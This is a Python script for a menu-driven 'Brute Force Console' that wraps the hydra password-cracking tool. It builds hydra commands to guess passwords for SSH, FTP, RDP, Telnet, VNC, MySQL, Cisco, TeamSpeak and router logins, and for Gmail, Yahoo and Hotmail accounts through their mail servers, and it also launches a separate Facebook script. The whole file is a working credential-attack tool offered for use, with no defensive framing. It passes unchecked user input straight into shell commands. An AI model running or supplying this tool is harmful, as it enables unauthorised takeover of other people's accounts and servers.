import os
import sys
import time

def restart_program():
    python = sys.executable
    os.execl(python, python, *sys.argv)

def clear_screen():
    os.system("clear")

def display_banner():
    os.system("figlet Brute Force")

def brute_force_menu():
    clear_screen()
    display_banner()
    print()
    print("  [01]> Cisco Brute Force         ")
    print("  [02]> VNC Brute Force           ")
    print("  [03]> FTP Brute Force           ")
    print("  [04]> Gmail Brute Force         ")
    print("  [05]> SSH Brute Force           ")
    print("  [06]> TeamSpeak Brute Force     ")
    print("  [07]> Telnet Brute Force        ")
    print("  [08]> Yahoo Mail Brute Force    ")
    print("  [09]> Hotmail Brute Force       ")
    print("  [10]> Router Speedy Brute Force ")
    print("  [11]> RDP Brute Force           ")
    print("  [12]> MySQL Brute Force         ")
    print("  [13]> Facebook Brute Force      ")
    print()
    print(" [00]> Exit")
    print()

def get_user_choice():
    return input("Brute Force Console ==>> ")

def run_command(command):
    os.system(command)

def cisco_brute_force():
    clear_screen()
    os.system("figlet Cisco Brute Force")
    iphost = input("[*] IP/Hostname : ")
    word = input("[*] Wordlist : ")
    run_command(f"hydra -P {word} {iphost} cisco")
    sys.exit()

def vnc_brute_force():
    clear_screen()
    os.system("figlet VNC Brute Force")
    word = input("[*] Wordlist : ")
    iphost = input("[*] IP/Hostname : ")
    run_command(f"hydra -P {word} -e n -t 1 {iphost} vnc -V")
    sys.exit()

def ftp_brute_force():
    os.system("figlet FTP Brute Force")
    user = input("[*] User : ")
    iphost = input("[*] IP/Hostname : ")
    word = input("[*] Wordlist : ")
    run_command(f"hydra -l {user} -P {word} {iphost} ftp")
    sys.exit()

def gmail_brute_force():
    clear_screen()
    os.system("figlet Gmail Brute Force")
    email = input("[*] Email : ")
    word = input("[*] Wordlist : ")
    run_command(f"hydra -l {email} -P {word} -s 465 smtp.gmail.com smtp")
    sys.exit()

def ssh_brute_force():
    clear_screen()
    os.system("figlet SSH Brute Force")
    user = input("[*] User : ")
    word = input("[*] Wordlist : ")
    iphost = input("[*] IP/Hostname : ")
    run_command(f"hydra -l {user} -P {word} {iphost} ssh")
    sys.exit()

def teamspeak_brute_force():
    clear_screen()
    os.system("figlet TeamSpeak Brute Force")
    user = input("[*] User : ")
    word = input("[*] Wordlist : ")
    iphost = input("[*] IP/Hostname : ")
    run_command(f"hydra -l {user} -P {word} -s 8676 {iphost} teamspeak")
    sys.exit()

def telnet_brute_force():
    clear_screen()
    os.system("figlet Telnet Brute Force")
    user = input("[*] User : ")
    word = input("[*] Wordlist : ")
    iphost = input("[*] IP/Hostname : ")
    run_command(f"hydra -l {user} -P {word} {iphost} telnet")
    sys.exit()

def yahoo_brute_force():
    clear_screen()
    os.system("figlet Yahoo Brute Force")
    email = input("[*] Email : ")
    word = input("[*] Wordlist : ")
    run_command(f"hydra -l {email} -P {word} -s 587 smtp.mail.yahoo.com smtp")
    sys.exit()

def hotmail_brute_force():
    clear_screen()
    os.system("figlet Hotmail Brute Force")
    email = input("[*] Email : ")
    word = input("[*] Wordlist : ")
    run_command(f"hydra -l {email} -P {word} -s 587 smtp.live.com smtp")
    sys.exit()

def router_speedy_brute_force():
    clear_screen()
    os.system("figlet Router Speedy Brute Force")
    user = input("[*] User : ")
    word = input("[*] Wordlist : ")
    iphost = input("[*] IP/Hostname : ")
    run_command(f"hydra -m / -l {user} -P {word} {iphost} http-get")
    sys.exit()

def rdp_brute_force():
    clear_screen()
    os.system("figlet RDP Brute Force")
    user = input("[*] User : ")
    word = input("[*] Wordlist : ")
    iphost = input("[*] IP/Hostname : ")
    run_command(f"hydra -t 1 -V -f -l {user} -P {word} {iphost} rdp")
    sys.exit()

def mysql_brute_force():
    clear_screen()
    os.system("figlet MySQL Brute Force")
    user = input("[*] User : ")
    word = input("[*] Wordlist : ")
    run_command(f"hydra -t 5 -V -f -l {user} -e ns -P {word} localhost mysql")
    sys.exit()

def facebook_brute_force():
    clear_screen()
    os.system("figlet Facebook Brute Force")
    run_command("python2 facebook")
    sys.exit()

def main():
    brute_force_menu()
    bhydra = get_user_choice()

    actions = {
        '01': cisco_brute_force,
        '1': cisco_brute_force,
        '02': vnc_brute_force,
        '2': vnc_brute_force,
        '03': ftp_brute_force,
        '3': ftp_brute_force,
        '04': gmail_brute_force,
        '4': gmail_brute_force,
        '05': ssh_brute_force,
        '5': ssh_brute_force,
        '06': teamspeak_brute_force,
        '6': teamspeak_brute_force,
        '07': telnet_brute_force,
        '7': telnet_brute_force,
        '08': yahoo_brute_force,
        '8': yahoo_brute_force,
        '09': hotmail_brute_force,
        '9': hotmail_brute_force,
        '10': router_speedy_brute_force,
        '11': rdp_brute_force,
        '12': mysql_brute_force,
        '13': facebook_brute_force,
        '00': restart_program,
        '0': restart_program
    }

    if bhydra in actions:
        actions[bhydra]()
    else:
        print("\n[!] ERROR : Wrong Input")
        time.sleep(1)
        restart_program()

if __name__ == "__main__":
    main()
